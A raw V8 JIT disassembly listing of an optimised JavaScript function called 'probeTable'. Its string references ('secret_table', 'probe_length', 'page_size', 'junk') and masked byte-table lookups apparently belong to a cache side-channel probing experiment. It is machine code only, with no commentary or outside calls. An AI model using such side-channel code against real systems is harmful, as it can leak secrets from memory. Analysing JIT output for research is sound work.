0x1425ddef67b0   5d0  0f8577080000   jnz 0x1425ddef702d  <+0xe4d>
0x1425ddef67b6   5d6  4c8b4e17       REX.W movq r9,[rsi+0x17]
0x1425ddef67ba   5da  4c8b5e0f       REX.W movq r11,[rsi+0xf]
0x1425ddef67be   5de  8b7633         movl rsi,[rsi+0x33]
0x1425ddef67c1   5e1  4d8b5b17       REX.W movq r11,[r11+0x17]
0x1425ddef67c5   5e5  4c8ba560ffffff REX.W movq r12,[rbp-0xa0]
0x1425ddef67cc   5ec  443be6         cmpl r12,rsi
0x1425ddef67cf   5ef  0f835d080000   jnc 0x1425ddef7032  <+0xe52>
0x1425ddef67d5   5f5  430fb63423     movzxbl rsi,[r11+r12*1]
                  -- <not inlined:1128> --
0x1425ddef67da   5fa  4c8b4b2f       REX.W movq r9,[rbx+0x2f]
0x1425ddef67de   5fe  4d394da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),r9
0x1425ddef67e2   602  0f84e8030000   jz 0x1425ddef6bd0  <+0x9f0>
                  -- B77 start (in loop 43) --
                  -- <not inlined:1151> --
0x1425ddef67e8   608  83c601         addl rsi,0x1
                  -- <not inlined:1167> --
0x1425ddef67eb   60b  0fafce         imull rcx,rsi
0x1425ddef67ee   60e  0f8043080000   jo 0x1425ddef7037  <+0xe57>
                  -- <not inlined:1147> --
0x1425ddef67f4   614  4c3940ff       REX.W cmpq [rax-0x1],r8
0x1425ddef67f8   618  0f853e080000   jnz 0x1425ddef703c  <+0xe5c>
0x1425ddef67fe   61e  488b7017       REX.W movq rsi,[rax+0x17]
0x1425ddef6802   622  4c8b580f       REX.W movq r11,[rax+0xf]
0x1425ddef6806   626  448b7033       movl r14,[rax+0x33]
                  -- <not inlined:1179> --
0x1425ddef680a   62a  4c8bbd48ffffff REX.W movq r15,[rbp-0xb8]
0x1425ddef6811   631  4423f9         andl r15,rcx
                  -- <not inlined:1147> --
0x1425ddef6814   634  498b4b17       REX.W movq rcx,[r11+0x17]
0x1425ddef6818   638  453bfe         cmpl r15,r14
0x1425ddef681b   63b  0f8320080000   jnc 0x1425ddef7041  <+0xe61>
0x1425ddef6821   641  420fb60c39     movzxbl rcx,[rcx+r15*1]
0x1425ddef6826   646  498bf1         REX.W movq rsi,r9
0x1425ddef6829   649  48c1ee20       REX.W shrq rsi, 32
0x1425ddef682d   64d  33ce           xorl rcx,rsi
0x1425ddef682f   64f  41f6c101       testb r9,0x1
0x1425ddef6833   653  0f850d080000   jnz 0x1425ddef7046  <+0xe66>
                  -- <not inlined:1133> --
0x1425ddef6839   659  48c1e120       REX.W shlq rcx, 32
0x1425ddef683d   65d  48894b2f       REX.W movq [rbx+0x2f],rcx
                  -- B78 start (in loop 43) --
                  -- B79 start (in loop 43) --
                  -- <not inlined:1238> --
0x1425ddef6841   661  83bd50ffffff00 cmpl [rbp-0xb0],0x0
0x1425ddef6848   668  0f8517000000   jnz 0x1425ddef6865  <+0x685>
                  -- B80 start (in loop 43) --
                  -- <not inlined:1318> --
0x1425ddef684e   66e  488b5367       REX.W movq rdx,[rbx+0x67]
0x1425ddef6852   672  48b98955fb4dfd210000 REX.W movq rcx,0x21fd4dfb5589    ;; object: 0x21fd4dfb5589 <JSFunction probeTable (sfi = 0x139723ed8571)>
0x1425ddef685c   67c  483bca         REX.W cmpq rcx,rdx
0x1425ddef685f   67f  0f85e6070000   jnz 0x1425ddef704b  <+0xe6b>
                  -- B81 start (in loop 43) --
                  -- B82 start (in loop 43) --
0x1425ddef6865   685  4c8b9540ffffff REX.W movq r10,[rbp-0xc0]
0x1425ddef686c   68c  4c899558ffffff REX.W movq [rbp-0xa8],r10
0x1425ddef6873   693  488bf3         REX.W movq rsi,rbx
0x1425ddef6876   696  e9d5fcffff     jmp 0x1425ddef6550  <+0x370>
                  -- B83 start --
                  -- B84 start (deconstruct frame) --
                  -- <not inlined:1404> --
0x1425ddef687b   69b  498b45a0       REX.W movq rax,[r13-0x60] (root (0x16ddeb7025b1 <undefined>))
0x1425ddef687f   69f  488be5         REX.W movq rsp,rbp
0x1425ddef6882   6a2  5d             pop rbp
0x1425ddef6883   6a3  c20800         ret 0x8
                  -- B107 start (no frame) --
                  -- B4 start (deferred) --
                  -- <not inlined:460> --
0x1425ddef6886   6a6  48898568ffffff REX.W movq [rbp-0x98],rax
0x1425ddef688d   6ad  0b9568ffffff   orl rdx,[rbp-0x98]
0x1425ddef6893   6b3  48898d78ffffff REX.W movq [rbp-0x88],rcx
0x1425ddef689a   6ba  83fa00         cmpl rdx,0x0
0x1425ddef689d   6bd  0f8cad070000   jl 0x1425ddef7050  <+0xe70>
0x1425ddef68a3   6c3  4889bd70ffffff REX.W movq [rbp-0x90],rdi
0x1425ddef68aa   6ca  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef68ae   6ce  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef68b2   6d2  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef68b9   6d9  488b8568ffffff REX.W movq rax,[rbp-0x98]
0x1425ddef68c0   6e0  e99cf9ffff     jmp 0x1425ddef6261  <+0x81>
                  -- B8 start (deferred) --
                  -- <not inlined:416> --
0x1425ddef68c5   6e5  48898d78ffffff REX.W movq [rbp-0x88],rcx
0x1425ddef68cc   6ec  48898568ffffff REX.W movq [rbp-0x98],rax
0x1425ddef68d3   6f3  48bbb093190100000000 REX.W movq rbx,0x11993b0
0x1425ddef68dd   6fd  33c0           xorl rax,rax
0x1425ddef68df   6ff  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef68e3   703  e81892f5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x1425ddef68e8   708  488b8568ffffff REX.W movq rax,[rbp-0x98]
0x1425ddef68ef   70f  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef68f3   713  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef68f7   717  4c8b4db0       REX.W movq r9,[rbp-0x50]
0x1425ddef68fb   71b  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef6902   722  4c8b8548ffffff REX.W movq r8,[rbp-0xb8]
0x1425ddef6909   729  e986f9ffff     jmp 0x1425ddef6294  <+0xb4>
                  -- B12 start (deferred) --
                  -- <not inlined:529> --
0x1425ddef690e   72e  48898d78ffffff REX.W movq [rbp-0x88],rcx
0x1425ddef6915   735  48898568ffffff REX.W movq [rbp-0x98],rax
0x1425ddef691c   73c  83bd68ffffff00 cmpl [rbp-0x98],0x0
0x1425ddef6923   743  0f8431070000   jz 0x1425ddef705a  <+0xe7a>
0x1425ddef6929   749  488b8568ffffff REX.W movq rax,[rbp-0x98]
0x1425ddef6930   750  f7d8           negl rax
0x1425ddef6932   752  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1425ddef6939   759  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef693d   75d  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef6941   761  4c8b4db0       REX.W movq r9,[rbp-0x50]
0x1425ddef6945   765  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef694c   76c  4c8b8548ffffff REX.W movq r8,[rbp-0xb8]
0x1425ddef6953   773  e951f9ffff     jmp 0x1425ddef62a9  <+0xc9>
                  -- B18 start (deferred) --
0x1425ddef6958   778  498bdb         REX.W movq rbx,r11
0x1425ddef695b   77b  f7db           negl rbx
0x1425ddef695d   77d  48898d78ffffff REX.W movq [rbp-0x88],rcx
0x1425ddef6964   784  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1425ddef696b   78b  83fa00         cmpl rdx,0x0
0x1425ddef696e   78e  0f850c000000   jnz 0x1425ddef6980  <+0x7a0>
                  -- B19 start (deferred) --
0x1425ddef6974   794  488bc3         REX.W movq rax,rbx
0x1425ddef6977   797  33d2           xorl rdx,rdx
0x1425ddef6979   799  f7f7           divl rdi
0x1425ddef697b   79b  e905000000     jmp 0x1425ddef6985  <+0x7a5>
                  -- B20 start (deferred) --
0x1425ddef6980   7a0  23c3           andl rax,rbx
0x1425ddef6982   7a2  488bd0         REX.W movq rdx,rax
                  -- B21 start (deferred) --
0x1425ddef6985   7a5  83fa00         cmpl rdx,0x0
0x1425ddef6988   7a8  0f84d1060000   jz 0x1425ddef705f  <+0xe7f>
0x1425ddef698e   7ae  f7da           negl rdx
0x1425ddef6990   7b0  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6994   7b4  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef6998   7b8  4c8b4db0       REX.W movq r9,[rbp-0x50]
0x1425ddef699c   7bc  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef69a3   7c3  4c8b8548ffffff REX.W movq r8,[rbp-0xb8]
0x1425ddef69aa   7ca  e936f9ffff     jmp 0x1425ddef62e5  <+0x105>
                  -- B30 start (deferred) --
                  -- <not inlined:668> --
0x1425ddef69af   7cf  4509e7         orl r15,r12
0x1425ddef69b2   7d2  48898d78ffffff REX.W movq [rbp-0x88],rcx
0x1425ddef69b9   7d9  4183ff00       cmpl r15,0x0
0x1425ddef69bd   7dd  0f8ca1060000   jl 0x1425ddef7064  <+0xe84>
0x1425ddef69c3   7e3  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef69c7   7e7  4c8b4db0       REX.W movq r9,[rbp-0x50]
0x1425ddef69cb   7eb  488b9570ffffff REX.W movq rdx,[rbp-0x90]
0x1425ddef69d2   7f2  488bbd68ffffff REX.W movq rdi,[rbp-0x98]
0x1425ddef69d9   7f9  488b8558ffffff REX.W movq rax,[rbp-0xa8]
0x1425ddef69e0   800  4c8bb550ffffff REX.W movq r14,[rbp-0xb0]
0x1425ddef69e7   807  4c8b8548ffffff REX.W movq r8,[rbp-0xb8]
0x1425ddef69ee   80e  488b9d40ffffff REX.W movq rbx,[rbp-0xc0]
0x1425ddef69f5   815  e9c6f9ffff     jmp 0x1425ddef63c0  <+0x1e0>
                  -- B36 start (deferred) --
0x1425ddef69fa   81a  48894d80       REX.W movq [rbp-0x80],rcx
0x1425ddef69fe   81e  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6a02   822  4c899568ffffff REX.W movq [rbp-0x98],r10
0x1425ddef6a09   829  4c8b9570ffffff REX.W movq r10,[rbp-0x90]
0x1425ddef6a10   830  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6a17   837  e9d8010000     jmp 0x1425ddef6bf4  <+0xa14>
                  -- B37 start (deferred) --
0x1425ddef6a1c   83c  48898d60ffffff REX.W movq [rbp-0xa0],rcx
0x1425ddef6a23   843  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6a2a   84a  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6a31   851  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6a35   855  4c899568ffffff REX.W movq [rbp-0x98],r10
0x1425ddef6a3c   85c  4c8b9570ffffff REX.W movq r10,[rbp-0x90]
0x1425ddef6a43   863  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6a47   867  e90b020000     jmp 0x1425ddef6c57  <+0xa77>
                  -- B47 start (deferred) (in loop 43) --
                  -- <not inlined:460> --
0x1425ddef6a4c   86c  48898568ffffff REX.W movq [rbp-0x98],rax
0x1425ddef6a53   873  0b9568ffffff   orl rdx,[rbp-0x98]
0x1425ddef6a59   879  83fa00         cmpl rdx,0x0
0x1425ddef6a5c   87c  0f8c07060000   jl 0x1425ddef7069  <+0xe89>
0x1425ddef6a62   882  4c898d70ffffff REX.W movq [rbp-0x90],r9
0x1425ddef6a69   889  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6a6d   88d  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef6a71   891  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef6a75   895  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef6a7c   89c  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6a86   8a6  488b8568ffffff REX.W movq rax,[rbp-0x98]
0x1425ddef6a8d   8ad  e91cfbffff     jmp 0x1425ddef65ae  <+0x3ce>
                  -- B50 start (deferred) (in loop 43) --
                  -- <not inlined:416> --
0x1425ddef6a92   8b2  48898568ffffff REX.W movq [rbp-0x98],rax
0x1425ddef6a99   8b9  488b1d35feffff REX.W movq rbx,[rip+0xfffffe35]
0x1425ddef6aa0   8c0  33c0           xorl rax,rax
0x1425ddef6aa2   8c2  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6aa6   8c6  e85590f5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x1425ddef6aab   8cb  488b8568ffffff REX.W movq rax,[rbp-0x98]
0x1425ddef6ab2   8d2  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6ab6   8d6  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef6aba   8da  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef6abe   8de  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef6ac5   8e5  4c8b9d58ffffff REX.W movq r11,[rbp-0xa8]
0x1425ddef6acc   8ec  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6ad6   8f6  e9f0faffff     jmp 0x1425ddef65cb  <+0x3eb>
                  -- B54 start (deferred) (in loop 43) --
                  -- <not inlined:529> --
0x1425ddef6adb   8fb  48898568ffffff REX.W movq [rbp-0x98],rax
0x1425ddef6ae2   902  83bd68ffffff00 cmpl [rbp-0x98],0x0
0x1425ddef6ae9   909  0f8484050000   jz 0x1425ddef7073  <+0xe93>
0x1425ddef6aef   90f  488b8568ffffff REX.W movq rax,[rbp-0x98]
0x1425ddef6af6   916  f7d8           negl rax
0x1425ddef6af8   918  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1425ddef6aff   91f  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6b03   923  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef6b07   927  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef6b0b   92b  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef6b12   932  4c8b9d58ffffff REX.W movq r11,[rbp-0xa8]
0x1425ddef6b19   939  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6b23   943  e9b8faffff     jmp 0x1425ddef65e0  <+0x400>
                  -- B60 start (deferred) (in loop 43) --
0x1425ddef6b28   948  4c89e3         REX.W movq rbx,r12
0x1425ddef6b2b   94b  f7db           negl rbx
0x1425ddef6b2d   94d  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1425ddef6b34   954  83fa00         cmpl rdx,0x0
0x1425ddef6b37   957  0f850d000000   jnz 0x1425ddef6b4a  <+0x96a>
                  -- B61 start (deferred) (in loop 43) --
0x1425ddef6b3d   95d  488bc3         REX.W movq rax,rbx
0x1425ddef6b40   960  33d2           xorl rdx,rdx
0x1425ddef6b42   962  41f7f1         divl r9
0x1425ddef6b45   965  e905000000     jmp 0x1425ddef6b4f  <+0x96f>
                  -- B62 start (deferred) (in loop 43) --
0x1425ddef6b4a   96a  23c3           andl rax,rbx
0x1425ddef6b4c   96c  488bd0         REX.W movq rdx,rax
                  -- B63 start (deferred) (in loop 43) --
0x1425ddef6b4f   96f  83fa00         cmpl rdx,0x0
0x1425ddef6b52   972  0f8420050000   jz 0x1425ddef7078  <+0xe98>
0x1425ddef6b58   978  f7da           negl rdx
0x1425ddef6b5a   97a  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6b5e   97e  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef6b62   982  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1425ddef6b66   986  488b8d78ffffff REX.W movq rcx,[rbp-0x88]
0x1425ddef6b6d   98d  4c8b9d58ffffff REX.W movq r11,[rbp-0xa8]
0x1425ddef6b74   994  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6b7e   99e  e99cfaffff     jmp 0x1425ddef661f  <+0x43f>
                  -- B72 start (deferred) (in loop 43) --
                  -- <not inlined:668> --
0x1425ddef6b83   9a3  410bde         orl rbx,r14
0x1425ddef6b86   9a6  83fb00         cmpl rbx,0x0
0x1425ddef6b89   9a9  0f8cee040000   jl 0x1425ddef707d  <+0xe9d>
0x1425ddef6b8f   9af  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6b93   9b3  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef6b97   9b7  488b9568ffffff REX.W movq rdx,[rbp-0x98]
0x1425ddef6b9e   9be  4c8b8d60ffffff REX.W movq r9,[rbp-0xa0]
0x1425ddef6ba5   9c5  4c8b9d58ffffff REX.W movq r11,[rbp-0xa8]
0x1425ddef6bac   9cc  488b8550ffffff REX.W movq rax,[rbp-0xb0]
0x1425ddef6bb3   9d3  4c8bbd48ffffff REX.W movq r15,[rbp-0xb8]
0x1425ddef6bba   9da  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6bc4   9e4  488b8d70ffffff REX.W movq rcx,[rbp-0x90]
0x1425ddef6bcb   9eb  e92afbffff     jmp 0x1425ddef66fa  <+0x51a>
                  -- B85 start (deferred) --
0x1425ddef6bd0   9f0  488b9d58ffffff REX.W movq rbx,[rbp-0xa8]
0x1425ddef6bd7   9f7  48c1e320       REX.W shlq rbx, 32
0x1425ddef6bdb   9fb  48897580       REX.W movq [rbp-0x80],rsi
0x1425ddef6bdf   9ff  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6be6   a06  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6bed   a0d  48899d68ffffff REX.W movq [rbp-0x98],rbx
                  -- B86 start (deferred) --
0x1425ddef6bf4   a14  48898570ffffff REX.W movq [rbp-0x90],rax
0x1425ddef6bfb   a1b  48b8a180ed2397130000 REX.W movq rax,0x139723ed80a1    ;; object: 0x139723ed80a1 <String[4]: junk>
0x1425ddef6c05   a25  50             push rax
                  -- <not inlined:1128> --
0x1425ddef6c06   a26  4c898d60ffffff REX.W movq [rbp-0xa0],r9
0x1425ddef6c0d   a2d  48bb108c190100000000 REX.W movq rbx,0x1198c10
0x1425ddef6c17   a37  b801000000     movl rax,0x1
0x1425ddef6c1c   a3c  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6c20   a40  e8db8ef5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B87 start (deferred) --
0x1425ddef6c25   a45  488b9d58ffffff REX.W movq rbx,[rbp-0xa8]
0x1425ddef6c2c   a4c  48c1e320       REX.W shlq rbx, 32
0x1425ddef6c30   a50  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6c37   a57  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6c3b   a5b  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1425ddef6c42   a62  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6c49   a69  4889b560ffffff REX.W movq [rbp-0xa0],rsi
0x1425ddef6c50   a70  48899d68ffffff REX.W movq [rbp-0x98],rbx
                  -- B88 start (deferred) --
0x1425ddef6c57   a77  48898570ffffff REX.W movq [rbp-0x90],rax
0x1425ddef6c5e   a7e  48b87181ed2397130000 REX.W movq rax,0x139723ed8171    ;; object: 0x139723ed8171 <String[12]: secret_table>
0x1425ddef6c68   a88  50             push rax
                  -- <not inlined:867> --
0x1425ddef6c69   a89  488b1d9fffffff REX.W movq rbx,[rip+0xffffff9f]
0x1425ddef6c70   a90  b801000000     movl rax,0x1
0x1425ddef6c75   a95  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6c79   a99  e8828ef5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B89 start (deferred) --
0x1425ddef6c7e   a9e  488b9d58ffffff REX.W movq rbx,[rbp-0xa8]
0x1425ddef6c85   aa5  48c1e320       REX.W shlq rbx, 32
0x1425ddef6c89   aa9  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6c90   ab0  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6c94   ab4  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1425ddef6c9b   abb  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6ca2   ac2  48899560ffffff REX.W movq [rbp-0xa0],rdx
0x1425ddef6ca9   ac9  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x1425ddef6cb0   ad0  e915010000     jmp 0x1425ddef6dca  <+0xbea>
                  -- B90 start (deferred) --
0x1425ddef6cb5   ad5  488b8558ffffff REX.W movq rax,[rbp-0xa8]
0x1425ddef6cbc   adc  48c1e020       REX.W shlq rax, 32
0x1425ddef6cc0   ae0  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6cc7   ae7  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6ccb   aeb  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1425ddef6cd2   af2  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6cd9   af9  48899d60ffffff REX.W movq [rbp-0xa0],rbx
0x1425ddef6ce0   b00  4c89b568ffffff REX.W movq [rbp-0x98],r14
0x1425ddef6ce7   b07  48898570ffffff REX.W movq [rbp-0x90],rax
0x1425ddef6cee   b0e  e930010000     jmp 0x1425ddef6e23  <+0xc43>
                  -- B91 start (deferred) --
0x1425ddef6cf3   b13  488b8558ffffff REX.W movq rax,[rbp-0xa8]
0x1425ddef6cfa   b1a  48c1e020       REX.W shlq rax, 32
0x1425ddef6cfe   b1e  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6d05   b25  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6d09   b29  4c8ba560ffffff REX.W movq r12,[rbp-0xa0]
0x1425ddef6d10   b30  4c89b568ffffff REX.W movq [rbp-0x98],r14
0x1425ddef6d17   b37  48898570ffffff REX.W movq [rbp-0x90],rax
0x1425ddef6d1e   b3e  4c89a578ffffff REX.W movq [rbp-0x88],r12
0x1425ddef6d25   b45  e940010000     jmp 0x1425ddef6e6a  <+0xc8a>
                  -- B92 start (deferred) --
0x1425ddef6d2a   b4a  488b8558ffffff REX.W movq rax,[rbp-0xa8]
0x1425ddef6d31   b51  48c1e020       REX.W shlq rax, 32
0x1425ddef6d35   b55  4c898d70ffffff REX.W movq [rbp-0x90],r9
0x1425ddef6d3c   b5c  48898578ffffff REX.W movq [rbp-0x88],rax
0x1425ddef6d43   b63  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6d4a   b6a  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6d4e   b6e  e954010000     jmp 0x1425ddef6ea7  <+0xcc7>
                  -- B93 start (deferred) --
0x1425ddef6d53   b73  488b8558ffffff REX.W movq rax,[rbp-0xa8]
0x1425ddef6d5a   b7a  48c1e020       REX.W shlq rax, 32
0x1425ddef6d5e   b7e  4c8b9578ffffff REX.W movq r10,[rbp-0x88]
0x1425ddef6d65   b85  4c899570ffffff REX.W movq [rbp-0x90],r10
0x1425ddef6d6c   b8c  4c8b5580       REX.W movq r10,[rbp-0x80]
0x1425ddef6d70   b90  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6d77   b97  48894580       REX.W movq [rbp-0x80],rax
0x1425ddef6d7b   b9b  e961010000     jmp 0x1425ddef6ee1  <+0xd01>
                  -- B94 start (deferred) --
                  -- <not inlined:436> --
0x1425ddef6d80   ba0  488b8558ffffff REX.W movq rax,[rbp-0xa8]
0x1425ddef6d87   ba7  48c1e020       REX.W shlq rax, 32
0x1425ddef6d8b   bab  4c8b5580       REX.W movq r10,[rbp-0x80]
0x1425ddef6d8f   baf  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6d96   bb6  48894580       REX.W movq [rbp-0x80],rax
0x1425ddef6d9a   bba  e975010000     jmp 0x1425ddef6f14  <+0xd34>
                  -- B95 start (deferred) --
0x1425ddef6d9f   bbf  48899d60ffffff REX.W movq [rbp-0xa0],rbx
0x1425ddef6da6   bc6  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6dad   bcd  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6db4   bd4  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6db8   bd8  4c899568ffffff REX.W movq [rbp-0x98],r10
0x1425ddef6dbf   bdf  4c8b9570ffffff REX.W movq r10,[rbp-0x90]
0x1425ddef6dc6   be6  4c895580       REX.W movq [rbp-0x80],r10
                  -- B96 start (deferred) --
0x1425ddef6dca   bea  48898570ffffff REX.W movq [rbp-0x90],rax
0x1425ddef6dd1   bf1  48b82181ed2397130000 REX.W movq rax,0x139723ed8121    ;; object: 0x139723ed8121 <String[9]: page_size>
0x1425ddef6ddb   bfb  50             push rax
                  -- <not inlined:802> --
0x1425ddef6ddc   bfc  488b1d2cfeffff REX.W movq rbx,[rip+0xfffffe2c]
0x1425ddef6de3   c03  b801000000     movl rax,0x1
0x1425ddef6de8   c08  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6dec   c0c  e80f8df5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B97 start (deferred) --
0x1425ddef6df1   c11  4c89bd60ffffff REX.W movq [rbp-0xa0],r15
0x1425ddef6df8   c18  4c8b9568ffffff REX.W movq r10,[rbp-0x98]
0x1425ddef6dff   c1f  4c899578ffffff REX.W movq [rbp-0x88],r10
0x1425ddef6e06   c26  4c89a568ffffff REX.W movq [rbp-0x98],r12
0x1425ddef6e0d   c2d  4c8b9570ffffff REX.W movq r10,[rbp-0x90]
0x1425ddef6e14   c34  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6e18   c38  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6e1c   c3c  4c899570ffffff REX.W movq [rbp-0x90],r10
                  -- B98 start (deferred) --
0x1425ddef6e23   c43  48b82181ed2397130000 REX.W movq rax,0x139723ed8121    ;; object: 0x139723ed8121 <String[9]: page_size>
0x1425ddef6e2d   c4d  50             push rax
                  -- <not inlined:670> --
0x1425ddef6e2e   c4e  488b1ddafdffff REX.W movq rbx,[rip+0xfffffdda]
0x1425ddef6e35   c55  b801000000     movl rax,0x1
0x1425ddef6e3a   c5a  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6e3e   c5e  e8bd8cf5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B99 start (deferred) --
0x1425ddef6e43   c63  4c8bf7         REX.W movq r14,rdi
0x1425ddef6e46   c66  4c89a568ffffff REX.W movq [rbp-0x98],r12
0x1425ddef6e4d   c6d  4c8b9570ffffff REX.W movq r10,[rbp-0x90]
0x1425ddef6e54   c74  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6e58   c78  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6e5c   c7c  4c899570ffffff REX.W movq [rbp-0x90],r10
0x1425ddef6e63   c83  4889bd78ffffff REX.W movq [rbp-0x88],rdi
                  -- B100 start (deferred) --
0x1425ddef6e6a   c8a  48b84981ed2397130000 REX.W movq rax,0x139723ed8149    ;; object: 0x139723ed8149 <String[12]: probe_length>
0x1425ddef6e74   c94  50             push rax
                  -- <not inlined:650> --
0x1425ddef6e75   c95  488b1d93fdffff REX.W movq rbx,[rip+0xfffffd93]
0x1425ddef6e7c   c9c  b801000000     movl rax,0x1
0x1425ddef6e81   ca1  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef6e85   ca5  e8768cf5ff     call 0x1425dde4fb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B101 start (deferred) --
0x1425ddef6e8a   caa  4c8b9570ffffff REX.W movq r10,[rbp-0x90]
0x1425ddef6e91   cb1  4c895580       REX.W movq [rbp-0x80],r10
0x1425ddef6e95   cb5  4889bd70ffffff REX.W movq [rbp-0x90],rdi
0x1425ddef6e9c   cbc  4c8b55b0       REX.W movq r10,[rbp-0x50]
0x1425ddef6ea0   cc0  4c899578ffffff REX.W movq [rbp-0x88],r10
                  -- B102 start (deferred) --
0x1425ddef6ea7   cc7  48b84125401681180000 REX.W movq rax,0x188116402541    ;; object: 0x188116402541 <String[7]: address>
